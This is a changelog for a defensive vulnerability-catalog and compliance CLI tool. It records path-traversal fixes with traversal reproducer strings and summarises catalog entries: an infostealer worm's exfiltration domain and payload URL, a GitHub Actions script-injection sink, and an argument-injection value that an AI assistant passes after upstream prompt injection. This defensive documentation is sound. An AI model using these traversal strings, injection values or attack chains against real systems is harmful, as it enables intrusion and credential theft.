- `theater_verdict` validated against allowlist (`clear`, `present`, `theater`, `pending_agent_run`, `unknown`); off-allowlist values rejected with runtime_error.
- `jurisdiction_obligations` sorted by `window_hours` ascending so shortest-deadline obligations (DORA 4h) surface first.
- Non-day regression intervals (`wk`, `mo`, `yr`, `on_event`) now honored; previously only `\d+d` matched and 49 shipped triggers with `on_event` were silently dropped. `regression_event_triggers[]` + `regression_unparseable_triggers[]` surfaced.
- `precondition_check_source` provenance annotation: `'submission' | 'runOpts' | 'merged'` so operators reading attestations see whose precondition declarations the run actually used.
- `lockDir()` moved from `process.cwd()` to `os.tmpdir() + 'exceptd-locks-<platform>'` (overridable via `EXCEPTD_LOCK_DIR`) so cross-cwd invocations share lock state.

### Refresh upstream sources (lib/source-osv.js, lib/source-ghsa.js, lib/refresh-external.js)

GHSA + OSV `applyDiff` now route through `withCatalogLock` — previously they mutated `ctx.cveCatalog` in memory but never persisted. Bulk `--source ghsa|osv --apply` reported `applied: N updates` while the catalog file gained zero entries; under `--swarm`, KEV's lock-and-re-read overwrote the unflushed in-memory mutations. Lost-update bug closed.

`normalizeAdvisory` now defensively coerces non-string `published_at` / `published` / `modified` to null; iterates `vulnerabilities` / `affected` / `references` only when arrays; coerces GHSA `cvss.score` numerically; validates dates against ISO-8601 prefix + year-in-[1990, currentYear+1]. Garbage upstream values fall to null rather than throwing out of the import.

GHSA fixture envelope now rejects null / number / string roots; OSV `OSV_HOST_OVERRIDE` validates host + port. `isOsvId` + `fetchAdvisoryById` + `normalizeAdvisory` + `buildDiff` trim whitespace from operator-supplied identifiers. `pickCatalogKey` upper-cases non-CVE identifiers so mixed-case upstream doesn't produce duplicate catalog entries. CVSS v4-over-v3 fallback: when v4 wins version-order but `cvss4BaseScore` returns null, fall back to v3 score. GHSA `buildDiff` summary now discloses `ghsa_only_skipped` count.

### CLI (bin/exceptd.js)

- **Path traversal on attest read paths closed.** `attest show / export / verify / diff` and `reattest` now validate session-id against the same `^[A-Za-z0-9._-]{1,64}$` regex used on writes. Live reproducer `exceptd attest show '../../..'` (which dumped `~/.claude.json` and other home-dir JSON) no longer reads outside the attestation root.
- **`process.exit(1)` after stderr-write replaced with `process.exitCode = 1; return;`** in `emitError` and three sibling sites in `cmdRun` / `cmdCi`. Stderr drains under piped CI consumers.
- **`ai-run` now persists attestations** in both `--no-stream` and streaming modes. Previously the returned `session_id` couldn't be resolved by `attest show / verify / diff` or `reattest` because the persistence call was missing.
- **`attest list --playbook` honors multi-flag** (was: array-vs-scalar comparison silently returned `count: 0`). `--since` validated as parseable ISO-8601.
- `--evidence-dir` per-entry path-traversal guard hardened.

### Orchestrator + watch (orchestrator/)

- `bus.eventLog` is now a ring buffer (default cap 1000 entries; `EXCEPTD_EVENT_LOG_MAX_SIZE` env override). Previously unbounded: ~400 B/event monotonic growth — 462 MB at 1M events.
- `exceptd watch` now handles SIGTERM, SIGHUP, SIGBREAK in addition to SIGINT — container/k8s/systemd shutdown drains scheduler timers and releases the lockfile.
- Lockfile at `~/.exceptd/watch.lock` prevents two concurrent watch processes against the same store. Stale-lock check uses PID-liveness probe (`process.kill(pid, 0)`) plus 60s mtime fallback.
- Monthly + annual scheduler bootstrap now fires when overdue (was: only fired after 30/365 days of continuous uptime; weekly-restart watch processes never saw them). Last-fired state persisted at `~/.exceptd/scheduler-last-fired.json`.
- Scheduler bootstrap `runWeeklyCurrencyCheck()` call wrapped in try/catch matching the per-tick wrapper.
- `require('orchestrator/index')` no longer triggers full CLI execution — `main()` gated behind `if (require.main === module)`. Duplicate `case 'watch':` removed.
- `scanner.probeTls()` now honors `EXCEPTD_AIR_GAP=1` and uses `EXCEPTD_TLS_PROBE_TARGET` (default `registry.npmjs.org:443`) instead of hardcoded `google.com:443`.
- `scan --json` no longer emits `_deprecation` field (CLAUDE.md no-internal-narrative rule).
- `dispatch()` rejects non-array inputs (was: iterated a string char-by-char). `routeQuery('')` returns `[]` (was: matched all 38 skills via empty-substring short-circuit).
- `pipeline.buildHandoff` bounds-checks `stageIndex`; `currencyCheck` caches `manifest.json` reads with 60s TTL.
- Worker-pool `scriptPath` validator rejects Windows UNC + extended-path prefixes (`\\?\`, `\\.\`, `\\server`).
- New `--log-file <path>` on watch, `--concurrency N` on validate-cves, 50 MB cache-file cap on validateAllCvesPreferCache.

### Predeploy gates

- New `keys/EXPECTED_FINGERPRINT` pin: silent key rotation now fails the gate unless `KEYS_ROTATED=1` is explicitly set.
- New `manifest-snapshot.sha256` pin: manifest-snapshot integrity is now check-able instead of trusted blindly.
- `scripts/check-sbom-currency.js` now cross-checks `sbom.components[]` names + versions against `manifest.skills` and `vendor/blamejs/_PROVENANCE.json`. A renamed/version-bumped skill that didn't regenerate SBOM now fails the gate (was: count-only comparison).
- `scripts/check-test-coverage.js` (diff-coverage gate) tightened: identifier must appear inside an actual `test(`/`it(`/`describe(`/`assert(` call body in the same test file that has the matching `require()` — not just anywhere in the corpus. Default routing for unclassified files changed from `other → allowlisted` to `manual-review` so schema files / data catalogs / package.json drift surface in CI output.
- `scripts/verify-shipped-tarball.js` now re-`require()`s the extracted tarball's `lib/refresh-network.js` and re-parses the tarball with the shipped parser — `npm pack --offline` flag added. A regression in the parser that previously would have been invisible (gate only used the source-tree parser) now produces a structured divergence error.
- `lib/validate-cve-catalog.js` extends cross-ref resolution to walk `attack_refs`, `atlas_refs`, `d3fend_refs`, `framework_control_gaps` keys in addition to `cwe_refs`. New `--strict` flag mirrors `validate-playbooks.js` for v0.13.0 preview. All new findings emit as warnings to preserve patch-class.
- `lib/validate-indexes.js` refuses empty `source_hashes` table; rejects symlinked source entries (defense-in-depth).
- `lib/validate-catalog-meta.js` now applies the declared `freshness_policy.stale_after_days` (was: declared but never enforced). Warning by default; `--strict` promotes to error.
- Informational gates' WARN counts surface in the summary as `passed (N warnings)`.
- Two no-op offline gates (validate-cves / validate-rfcs with forced `--no-fail`) removed; total gates now 14 (was 16).
- New `scripts/validate-vendor-online.js` (opt-in) fetches each vendored file from upstream and verifies SHA-256 against `_PROVENANCE.json` pinned commit.

### Catalog data corrections

Nine CVE→catalog cross-ref breaks closed: missing CWE-669 + CWE-123 added; missing ATT&CK sub-techniques T1059.001/006/007 + T1078.001 added; CVE framework_control_gaps keys reconciled to the suffixed canonical names per v0.12.11 (`NIS2-Art21-patch-management`, `SOC2-CC6-logical-access`, `SOC2-CC9-vendor-management`); `ALL-MAJOR-FRAMEWORKS` stub removed; new `DORA-Art28` (ICT third-party risk monitoring) entry added.

15 ATLAS entries gained `last_verified` so freshness-decay logic can fire per-entry. `attack-techniques._meta.attack_version` changed from `"v17"` to `"17"` to match `manifest.json.attack_version`. `T0867`/`T1570` "Lateral Tool Transfer" duplicate disambiguated via `domain: ICS` vs `domain: Enterprise`.

`cwe-catalog.skills_referencing` contamination cleaned up: 16 entries that mixed skill dir names with playbook IDs split into `skills_referencing` + `playbooks_referencing`. CWE→CVE back-references symmetrized: CVE-2026-43500 ↔ CWE-787 and CVE-2025-53773 ↔ CWE-77.

`exploit-availability.json` extended with the 4 newest CVEs (CVE-2026-45321, MAL-2026-3083, CVE-2026-42208, CVE-2026-39884).

### Skill content corrections (operator-facing factual drift)

- **ATLAS TTP names corrected across 14 skills.** AML.T0054 was systematically mislabeled "Craft Adversarial Data — NLP" (it's "LLM Jailbreak"). AML.T0017 mislabeled "Develop Capabilities" (it's "Discover ML Model Ontology"). AML.T0016 mislabeled "Acquire Public ML Artifacts" (it's "Obtain Capabilities: Develop Capabilities"). AML.T0000 (non-existent) replaced with the actual reconnaissance tactic AML.TA0002.
- **CVE-2026-30615 (Windsurf MCP) re-aligned with catalog correction.** 17 skills cited CVSS 9.8 / "zero-interaction RCE"; catalog v0.12.9 correction documents CVSS 8.0 / AV:L / local-vector RCE requiring attacker-controlled HTML. Skill bodies and the exploit-scoring pedagogical example reframed accordingly.
- **CVE-2025-53773 (GitHub Copilot) re-aligned** across 11 skills: cited 9.6 / RWEP 42 (or 91), catalog says 7.8 / RWEP 30.
- **CVE-2026-31431 KEV date corrected** across 5 skills: cited 2026-03-15, catalog says 2026-05-01. Compliance-theater pedagogical "30 days exposed" narrative recomputed to "13 days exposed" against today's date.
- **ATT&CK v17 pin propagated** to incident-response-playbook, pqc-first, skill-update-loop (was citing v15.1 / v15 / v16). Spurious "AGENTS.md rule #12" reference corrected to "rule #8".
- **Four newest catalog CVEs cited in appropriate skills**: MAL-2026-3083 (mlops-security, zeroday-gap-learn), CVE-2026-42208 (ai-attack-surface, ai-c2-detection, rag-pipeline-security, dlp-gap-analysis), CVE-2026-39884 (mcp-agent-trust), CVE-2026-45321 (zeroday-gap-learn, ai-attack-surface, supply-chain-integrity).
- **Defensive Countermeasure Mapping section added** to kernel-lpe-triage, researcher, skill-update-loop (previously missing despite `last_threat_review >= 2026-05-11`).

### Repository

- `package.json files` allowlist extended with `keys/EXPECTED_FINGERPRINT` and `manifest-snapshot.sha256` so the new pin checks ship to operators.
- `vendor/blamejs/_PROVENANCE.json` `exceptd_deltas` documents the worker-pool UNC-path Windows rejection.

## 0.12.13 — 2026-05-14

**Patch: e2e scenarios pass `--ack` to exercise the v0.12.12 jurisdiction-clock contract.**

Two e2e scenarios (`02-tanstack-worm-payload`, `09-secrets-aws-key`) assert that `phases.close.jurisdiction_clocks_count >= 1` against a `detected` classification. The v0.12.12 contract: `clock_starts: detect_confirmed` no longer auto-stamps when classification turns `detected`; the operator must pass `--ack` for the clock to start. Both scenarios now pass `--ack`.

## 0.12.12 — 2026-05-13

**Patch: deep multi-surface hardening — engine semantics, concurrency, signing round-trip, output bundles, validators, scheduler, curation.**

### Engine semantics

`lib/playbook-runner.js` corrects several long-standing classification and clock bugs:

- **False-positive checks now gate classification.** When an indicator's `signal_overrides` says `hit` but the indicator's `false_positive_checks_required[]` haven't been attested, the verdict downgrades to `inconclusive` and `fp_checks_unsatisfied[]` is surfaced on the indicator. Operators attest FP checks with `signal_overrides: { '<id>__fp_checks': { '<check>': true } }`. Before: submitting a hit without attesting FP checks would auto-stamp `classification: detected`.
- **Dead branch on empty submission**: the indicator-default arm previously emitted `inconclusive` for both `anyCaptured` and the empty case. Empty submissions with no captured artifacts now correctly produce `classification: not_detected` with theater verdict `clear`.
- **`evalCondition` regex no longer crashes the run.** A malformed indicator condition (operator-authored regex) used to throw out of `analyze()`. Now wrapped in try/catch; the failure surfaces as `analyze.runtime_errors[]` with the source condition + exception message.
- **`--strict-preconditions` is now load-bearing.** The flag escalates `precondition_unverified` / `precondition_warn` / `precondition_skip` outcomes to halt, with `escalated_from` provenance. The CLI exit body now carries `strict_preconditions_violated[]` so consumers grep'ing the JSON see the contract reason without inspecting stderr.
- **`on_fail: skip_phase` is actually honored.** A precondition that fails `on_fail: skip_phase` now emits a placeholder detect phase `{skipped: true, classification: 'skipped', reason: <id>}` and runs analyze with empty signals. Previously the runner ignored the directive and proceeded into detect as if the precondition had passed.
- **`clock_starts: detect_confirmed` is bound to operator awareness.** Jurisdiction notification clocks (NIS2 24h, DORA 4h, GDPR 72h, etc.) no longer auto-stamp when classification turns `detected`; the operator must pass `--ack` for the clock to start. Without `--ack`, the notification entry carries `clock_pending_ack: true`. Matches the legal contract — the clock starts from operator awareness, not from the runner's decision.
- **`analyze.active_exploitation` is now the worst across matched CVEs**, not the first. Two matched CVEs where #1 is `suspected` and #2 is `confirmed` correctly report `confirmed`.
- **`signal_overrides` collisions are surfaced** rather than silently last-wins. Two observations targeting the same indicator id now record the discarded values in `analyze.signal_origins_with_collisions[]`.
- **Per-run playbook cache**: the runner reads the playbook once per `run()` invocation instead of re-loading it inside each of the seven phase calls.

### Scoring

`lib/scoring.js` exports a new `validateFactors(factors)` returning structured warnings for missing fields, out-of-range `blast_radius`, or non-enum `active_exploitation`. `scoreCustom(factors, {collectWarnings: true})` returns the score plus `_scoring_warnings[]` for downstream consumers; the bare-number return is preserved for backwards compatibility.

### Concurrency

Catalog read-modify-write was racy under concurrent `refresh --advisory --apply` invocations — five sites in `lib/refresh-external.js` and two in `lib/prefetch.js`. Now serialized via `withCatalogLock` / `withIndexLock` (lockfile-gated, atomic tmp+rename writes; 30s stale-lock reaper for crash recovery). Concurrent applies to distinct CVEs now both survive in the final catalog rather than 1/20 trials losing an entry to interleaved writes. Same pattern applied to the prefetch `_index.json`.

`persistAttestation` (in `bin/exceptd.js`) no longer has a TOCTOU window between `existsSync` and `writeFileSync` — atomic create via `flag: 'wx'` (`O_EXCL`) guarantees that two concurrent runs sharing a session-id produce one winner and one explicit `EEXIST` rather than silent last-write-wins.

`lib/refresh-external.js` post-pool `process.exit()` calls replaced with `process.exitCode = N; return;` so buffered stdout drains before the event loop ends (same v0.11.10 class).

### Signing round-trip

`lib/sign.js` + `lib/verify.js` now normalize content (strip UTF-8 BOM, convert CRLF → LF) before computing or verifying signatures. A skill body cloned with `core.autocrlf=true` on Windows but signed on Linux CI no longer fails verification on the consumer side. Byte-level proof: all four variants of `hello\nworld\n` (LF, CRLF, BOM+LF, BOM+CRLF) normalize to the identical signature.

Manifest schema validation lands in `lib/schemas/manifest.schema.json` + `loadManifestValidated()`. A tampered manifest with `path: "../../../etc/passwd"` is rejected at load time before any skill resolution. Per-skill paths must match `^skills/[A-Za-z0-9._/-]+/skill\.md$`.

`lib/lint-skills.js` rejects duplicate frontmatter keys (last-wins parsing previously masked identity spoofing) and walks `skills/` for orphan `skill.md` files not referenced in the manifest.

The fingerprint banner now prints AFTER the verdict line in both `sign-all` and `verify`, so a quick read of `gh run watch` output isn't ambiguous about pass/fail.

### Path traversal hardening

- `--session-id` now enforces `^[A-Za-z0-9._-]{1,64}$` (alphanumeric, dot, underscore, hyphen; up to 64 chars). Path separators and `..` are rejected at input.
- `--attestation-root` rejects `..`-bearing relative paths and resolves to an absolute path before propagation.
- `--evidence-dir` validates each `<id>.json` entry, refuses traversal-escaping resolved paths.
- `--evidence` enforces a 32 MB file-size limit to defend against adversarial JSON bombs.
- `persistAttestation` validates the session-id + filename and confirms the resolved directory stays under the attestation root.
- `parseTar` in `lib/refresh-network.js` skips entries with `..` segments or absolute paths — defense-in-depth against a compromised registry CDN shipping path-traversal tarballs.

### Output bundles (CSAF 2.0 / SARIF 2.1.0 / OpenVEX 0.2.0)

`buildEvidenceBundle()` in `lib/playbook-runner.js` produces bundles that pass canonical-schema validation against each spec:

- **CSAF**: `csaf_security_advisory` documents now include a populated `product_tree.full_product_names[]`; every `vulnerabilities[]` entry references a declared product via `product_status` (`known_affected` / `fixed` / `under_investigation`). NVD / Red Hat / ENISA CSAF dashboards previously rejected exceptd CSAF output for missing product_tree.
- **SARIF**: indicator-hit results now populate `physicalLocation.artifactLocation.uri` from the playbook's look-phase artifact source paths so GitHub Code Scanning surfaces them. Null property-bag keys are pruned. Framework-gap results carry `kind: "informational"` per spec §3.27.9.
- **OpenVEX**: every statement carries `products` (B1). Status semantics rebuilt — indicator hits become `affected` with an `action_statement` from the validate phase's selected remediation; misses become `not_affected` with `vulnerable_code_not_present` justification; inconclusive stays `under_investigation` (no action_statement). Framework-gap statements are removed from the VEX feed entirely (they're control-design observations, not vulnerabilities — they remain in CSAF and SARIF). Vulnerability `@id` values now follow RFC 8141 (`urn:cve:<id>`, `urn:exceptd:indicator:<playbook>:<id>`), replacing the unregistered `exceptd:` scheme.

### Validators

`lib/validate-playbooks.js` is a new validator that checks all 13 shipped playbooks against `lib/schemas/playbook.schema.json` plus cross-catalog references (`atlas_refs`, `cve_refs`, `cwe_refs`, `d3fend_refs`, `attack_refs`), internal consistency (duplicate indicator ids, RWEP threshold ordering, obligation_ref resolution), and feeds_into / mutex / skill_chain resolution. Wired as predeploy gate 16 (informational in v0.12.12; flips to enforcing in v0.13.0). 75-entry `data/attack-techniques.json` lands to support `attack_refs` resolution across skills and playbooks.

`lib/validate-cve-catalog.js` adds warning-class checks for the Hard Rule #14 iocs-when-poc-and-exploit-url contract, `atlas_refs` + `cwe_refs` cross-catalog resolution, duplicate-name detection, impossible-date guards, and strict CVSS-version prefix recognition. All new findings emit as warnings in v0.12.12 to preserve patch-class compatibility; v0.13.0 will flip them to errors.

`lib/lint-skills.js` extends section detection to require an anchored `^## <Section>` heading with ≥20 words of body text (warning-class), resolves `attack_refs` against `data/attack-techniques.json`, and flags missing "Defensive Countermeasure Mapping" sections on skills whose `last_threat_review >= 2026-05-11`.

### Curation `--apply`

`lib/cve-curation.js` gains the missing apply path. `curate(cveId, {apply: true, answers})` validates each answer against a per-field whitelist, applies, derives `rwep_score` from `rwep_factors` when an explicit score isn't supplied, computes `residual_warnings[]` against the required-schema set, and promotes the draft (strips `_auto_imported` + `_draft` + `_draft_reason`) when zero warnings remain. CLI surface: `exceptd refresh --curate <id> --answers <file>` or the explicit `--apply` alias. The questionnaire now always asks for `cvss_score`, `cvss_vector`, patch fields, `affected_versions`, and `cisa_kev` when those are unpopulated — without these, the apply path can't produce a schema-passing entry. Severity rendering for `cvss_score: null` returns `unrated` (was misleading `low`). Catalog reads honor absolute paths on Windows. OSV-imported drafts now show `"OSV: <id>"` in `auto_imported_from` (was always `"unknown"`).

### Scheduler

`orchestrator/scheduler.js` `MONTHLY_CVE_VALIDATION` (2.59 billion ms) and `ANNUAL_AUDIT` (31.5 billion ms) exceeded Node's INT32 setTimeout limit (2.15 billion ms), which silently clamps to 1 ms — producing a 1000 fires/sec stdout flood on idle `exceptd watch`. New `scheduleEvery(intervalMs, handler)` primitive uses a bounded `setInterval` (capped at 24 h) with wall-clock elapsed comparison. Idle watch goes from 1000 lines/sec to 0.

### Predeploy

`scripts/predeploy.js` now reports per-gate timing (`(NNN ms)` next to each pass / fail / informational line + the summary table). New 16th gate `Validate playbooks` runs informationally in v0.12.12.

### Repository

- `.github/workflows/ci.yml` gains a `validate-playbooks` job (`continue-on-error: true` in v0.12.12).
- `manifest-snapshot.json` + `sbom.cdx.json` + `data/_indexes/` refreshed.
- `data/attack-techniques.json` new — 75 ATT&CK technique entries with v17 metadata, supporting `attack_refs` resolution across the catalog.

## 0.12.11 — 2026-05-13

**Patch: OSV source hardening, indicator regex widening, CWE/framework-gap reconciliation.**

### OSV source hardening

`lib/source-osv.js` matures from greenfield to GHSA-parity:

- **Structured fixture-I/O error envelope.** Missing or malformed `EXCEPTD_OSV_FIXTURE` paths no longer crash with a Node stack trace; the source returns `{ok:false, error, source:"offline"}` matching the GHSA convention. Operators piping the CLI through `jq` or scripting around exit codes get a structured failure they can branch on.
- **Case-fold ids before lookup.** `fetchAdvisoryById("mal-2026-3083")` (lowercase) now resolves correctly. OSV.dev's `/v1/vulns/{id}` is case-sensitive — the source uppercases the id at entry before any branch on fixture lookup or network call.
- **Highest-CVSS-version wins + compute from vector.** `extractCvss` previously overwrote the chosen vector on every loop iteration ("last wins" not "highest-version wins") and returned `null` `score` when the OSV record carried only a vector string with no embedded numeric tail. Both fixed: explicit version-comparison via the `CVSS:N.M` prefix, and a new `cvss3BaseScore(vector)` helper that computes the CVSS 3.1 base score per FIRST §7.1 (handles Scope:U + Scope:C). MAL-* records that previously normalized to `cvss_score: null` / `active_exploitation: "unknown"` now carry computed scores.
- **GHSA-404 → OSV fallback for CVE-*.** `seedSingleAdvisory` previously routed `CVE-*` unconditionally through `source-ghsa`. When GHSA returned 404 for a CVE that had only PYSEC / RUSTSEC / SNYK / MAL coverage, the operator saw `GHSA returned HTTP 404` even though OSV had the record. Now: on GHSA-404 for a CVE-* id, retry via `source-osv.fetchAdvisoryById(id)`; surface the combined error when both 404.
- **`epss_note` on non-CVE drafts.** Non-CVE catalog keys (MAL-*, SNYK-*, RUSTSEC-*, etc.) now carry a populated `epss_note` documenting the FIRST EPSS API limitation — drafts no longer look incomplete to downstream consumers grepping for the field.
- **`verification_sources` deduped.** The canonical `osv.dev/vulnerability/<id>` URL was previously both prepended unconditionally AND pulled from `rec.references[]`. Deduped via `new Set` before return.
- **`buildDiff` error categorization.** Returns `unreachable_count` + `normalize_error_count` separately so an operator can distinguish "OSV unreachable" from "10 ids returned but none normalized cleanly."
- **`GHSA-` dropped from `OSV_ID_PREFIXES`.** The export previously listed GHSA-* even though the dispatcher unconditionally routes GHSA-* through `source-ghsa`. `isOsvId("GHSA-...")` now returns false. A top-of-file comment documents the routing decision (GHSA has richer field coverage for that namespace).
- **`OSV_HOST_OVERRIDE` env var for offline HTTP testing.** New stubbing surface — lets `tests/source-osv.test.js` spin up a local HTTP server to exercise HTTP 500 / 429 / timeout / parse-error paths previously uncovered. 429 surfaces as `rate-limited`; timeout error message clarified.
- **`seedSingleAdvisory` exported** for in-process testing.

### Indicator regex widening

`gha-workflow-script-injection-sink` (added v0.12.10) previously anchored on `run:\s*\|` (block-scalar pipe only). Single-line `run: echo "${{ github.event.comment.body }}"` bypassed the regex despite being the same vulnerability class. Widened to `run:[\s\S]*?...` which admits both block-scalar AND single-line forms. The indicator's `confidence` drops from `deterministic` → `high` and `deterministic` flag flips to `false` to reflect the reasoning step still required for the false-positive demotion (sandboxed `pull_request` + `contents: read` permissions). `tests/gha-workflow-script-injection-sink.test.js` lands as a new end-to-end regex test with 8 fixture YAML cases covering both the catch and the FP-demotion classes. All 5 of this repo's own `.github/workflows/*.yml` files remain clean against the widened regex.

### CWE reverse-references

The v0.12.10 catalog additions cited existing CWEs (CWE-89, CWE-77, CWE-94) without updating their reverse-reference `evidence_cves` arrays. Bidirectional linkage restored: CWE-89 now lists CVE-2026-42208 (LiteLLM SQLi), CWE-77 lists MAL-2026-3083 (elementary-data secondary classification), CWE-94 adds MAL-2026-3083 alongside the existing CVE-2025-53773 and CVE-2026-30615.

### Framework-control-gaps key reconciliation

Eight `framework_control_gaps` keys used by the v0.12.10 catalog additions did not resolve in `data/framework-control-gaps.json`. Six reconciled to canonical existing forms: `SLSA-L3` → `SLSA-v1.0-Build-L3`; `OWASP-LLM01` → `OWASP-LLM-Top-10-2025-LLM01`; `NIST-800-218-PO.4` → `NIST-800-218-SSDF`; `NIS2-Art21-2d` / `-2g` → `NIS2-Art21-patch-management`; `NIS2-Art21-2e` → `NIS2-Art21-incident-handling`. Two genuinely-distinct citations gained new entries in the framework-gaps catalog: `EU-CRA-Art13` (essential cybersecurity requirements + technical documentation; the elementary-data class of supply-chain compromise where the maintainer is a victim) and `NIST-800-53-SI-10` (information input validation; the trust-boundary-vs-inside-boundary distinction that argument-injection / SQL-injection / prompt-injection exploit). All `framework_control_gaps` references in the catalog now resolve to a real entry.

### Repository

- `lib/source-ghsa.js` "unrecognized id format" error message widened to enumerate the OSV-native prefixes operators can pass via `--advisory` (was previously CVE/GHSA only).
- `README.md` documents the OSV source: install command, `--advisory MAL-...` form, `EXCEPTD_OSV_FIXTURE` env var, the fresh-disclosure workflow expanded to mention OSV's coverage breadth.

## 0.12.10 — 2026-05-13

**Patch: OSV.dev wired as an upstream source, three new catalog entries, one new library-author indicator.**

### OSV.dev as a new upstream source

`lib/source-osv.js` + `OSV_SOURCE` in `lib/refresh-external.js` add OSV.dev (https://api.osv.dev/) as a recognised upstream pull. Operators run `exceptd refresh --source osv` to import advisories from the OSV-aggregated dataset, which covers the OSSF Malicious Packages namespace (`MAL-*`), Snyk advisories (`SNYK-*`), GitHub Advisory Database (`GHSA-*`), RustSec (`RUSTSEC-*`), Mageia (`MGASA-*`), Go Vuln DB (`GO-*`), Ubuntu USN (`USN-*`), PYSEC, and UVI — one unauthenticated API in place of N per-vendor feeds.

The `--advisory <id>` flag now routes non-CVE / non-GHSA identifiers (`MAL-*`, `SNYK-*`, `RUSTSEC-*`, `USN-*`, `UVI-*`, `GO-*`, `MGASA-*`, `PYSEC-*`) through `source-osv`. CVE-* and GHSA-* continue routing through `source-ghsa` because the GitHub Advisory Database carries richer field coverage for those namespaces. Imported entries land as `_auto_imported: true` / `_draft: true` drafts, the same shape GHSA imports use — editorial fields (framework_control_gaps, full iocs, atlas_refs, attack_refs, rwep_factors) remain null until a human or AI assistant runs the cve-curation skill.

When an OSV record carries a `CVE-*` value in its `aliases`, the catalog key is the CVE form and the OSV identifier moves to an `aliases` array on the entry. When no CVE is assigned (e.g. MAL-* malicious-package compromises), the OSV identifier IS the catalog key. The previous identifier convention (CVE-only keys) is preserved as the default; the new identifier shapes are an extension.

Fixture support: `EXCEPTD_OSV_FIXTURE` env var (path to a JSON file with one or many OSV records) enables offline testing — same convention as the existing `EXCEPTD_GHSA_FIXTURE`.

### Three new catalog entries

- **`MAL-2026-3083`** (OSV-native key for the **elementary-data PyPI worm**, April 2026). 1.1M-monthly-downloads package compromised via a GitHub Actions script-injection sink in the project's own workflow (`update_pylon_issue.yml` interpolated `${{ github.event.comment.body }}` directly into a `run:` shell, escalated via the workflow's `GITHUB_TOKEN` to forge an orphan-commit release). Payload was a single `elementary.pth` file in the wheel (Python auto-exec at install time, not import time); infostealer sweeping dbt warehouse creds, AWS/GCP/Azure credentials, SSH keys, Kubernetes configs, cryptocurrency wallets to `igotnofriendsonlineorirl-imgonnakmslmao.skyhanni.cloud` with second-stage at `litter.catbox.moe/iqesmbhukgd2c7hq.sh`. Cataloged from OSV's OSSF Malicious Packages dataset (which published 2026-04-24, 4 days before the Snyk advisory). Aliases retained: `SNYK-PYTHON-ELEMENTARYDATA-16316110`, `pypi/2026-04-compr-elementary-data/elementary-data`. Full Hard Rule #14 IoC block; precedent-setting first MAL-* entry in the catalog.

- **`CVE-2026-42208`** (BerriAI LiteLLM Proxy Auth SQL Injection). CVSS 9.3, **on CISA KEV** (dateAdded 2026-05-08). Crafted Authorization header to any LLM API route reaches a SQL query through the error-logging pathway with the attacker value concatenated rather than parameterised — read/modify the LiteLLM-managed-credentials database without prior auth. Affected: `litellm >= 1.81.16, < 1.83.7`. Patched: 1.83.7+ (parameterised query). Temporary workaround: `general_settings: disable_error_logs: true`. RWEP 65 (P1 / 72h timeline). Operator IoCs: Authorization header > 100 chars or carrying SQL metacharacters; mass key-mint events in LiteLLM logs without admin-UI sessions.

- **`CVE-2026-39884`** (Flux159 mcp-server-kubernetes Argument Injection). CVSS 8.3. The `port_forward` MCP tool builds a kubectl command string and `.split(' ')`s it instead of using an argv array, so an AI assistant feeding `resourceName: "pod-name --address=0.0.0.0"` (typically via prompt injection upstream) lands attacker flags in kubectl's argv — binds port-forward to all interfaces or redirects to attacker namespace. Affected: `mcp-server-kubernetes <= 3.4.0`. Patched: 3.5.0+ (argv-array refactor). Operator IoCs: MCP audit logs showing port_forward calls with spaces or `--`/`-n` in resourceName; kubectl port-forward processes with `--address=0.0.0.0` on hosts that don't manually port-forward.

Three matching `data/zeroday-lessons.json` entries follow the CVE-2026-45321 lesson shape. Five new control requirements derived from the lessons: NEW-CTRL-011 (GHA script-injection-sink ban), NEW-CTRL-012 (orphan-commit release detection), NEW-CTRL-013 (AI-gateway credential-store isolation), NEW-CTRL-014 (MCP-server argv not shellstring), NEW-CTRL-015 (MCP tool allowlist enforcement).

### One new library-author indicator

`gha-workflow-script-injection-sink` flags any `.github/workflows/*.yml` workflow that interpolates an attacker-controllable `${{ github.event.* }}` field directly into a `run:` shell script — the exact sink the elementary-data attack exploited. Detection grep covers `github.event.comment.body`, `github.event.issue.body`, `github.event.issue.title`, `github.event.pull_request.body`, `github.event.pull_request.title`, `github.event.review.body`, `github.event.head_commit.message`, `github.head_ref`, `github.event.discussion.body`, `github.event.discussion.title`. False-positive demotion path: if the workflow captures the value into an `env:` variable first OR runs only on `pull_request` (sandboxed, not `pull_request_target`) with default-read permissions, the sink isn't exploitable. Cross-referenced to MAL-2026-3083.

### Catalog extensions

- `data/cwe-catalog.json` gains CWE-506 (Embedded Malicious Code) and CWE-88 (Improper Neutralization of Argument Delimiters). Both backed by the new catalog entries.
- `data/cve-catalog.json` `_meta.id_conventions` documents the MAL-*/SNYK-*/GHSA-*/RUSTSEC-* identifier shapes the catalog now accepts, the alias-retention convention when MITRE issues a CVE later, and the EPSS limitation (FIRST only indexes CVE identifiers).

## 0.12.9 — 2026-05-13

**Patch: Hard Rule #15 diff-coverage gate flips blocking, sbom evidence-correlation fix, CVE catalog freshness corrections, recovery of two CLI fixes lost across an interrupted refactor.**

### Hard Rule #15 — diff-coverage gate is now blocking

`scripts/check-test-coverage.js` flips from `--warn-only` to a blocking gate. The 15th `npm run predeploy` gate and the `Diff coverage` CI job now fail a run if any change to a CLI verb, CLI flag, `module.exports` identifier, playbook indicator, or CVE `iocs` field lands without a covering test reference. Two analyzer bugs that would have made the gate unreliable under blocking are fixed in the same release:

- `coversLibExport` now recognises subprocess-based test invocations (e.g. `spawnSync(... "scripts/check-sbom-currency.js" ...)`) alongside `require(...)`-form coverage.
- `extractLibExports` strips block and line comments before matching `module.exports = {...}`, eliminating the doc-comment shadow bug where the analyzer's regex captured a JSDoc banner and returned an empty export set.

`tests/playbook-indicators.test.js` lands as a table-driven test referencing all 12 indicator ids added in v0.12.7 (`mcp.json` × 6) and v0.12.8 (`containers.json` × 2, `hardening.json` × 4). The new tests cover the Hard Rule #15 surface the analyzer flagged.

### sbom `matched_cves` now evidence-correlated

`exceptd run sbom` previously surfaced every CVE in the playbook's `domain.cve_refs` under `analyze.matched_cves`, regardless of whether the operator's submitted evidence correlated to any of them. Operators reading the output assumed they were affected by the listed CVEs. The analyze phase now splits into two fields:

- `analyze.matched_cves` — only CVEs correlated to operator evidence (indicator hit whose `attack_ref`/`atlas_ref` intersects the CVE's refs, or an explicit `signals[cveId]` set to `true`/`hit`/`detected`/`affected`). Each entry carries a `correlated_via` reason.
- `analyze.catalog_baseline_cves` — the playbook's CVE catalog (informational; not an affected-status list). Each entry carries `correlated_via: null` and a note documenting the distinction.

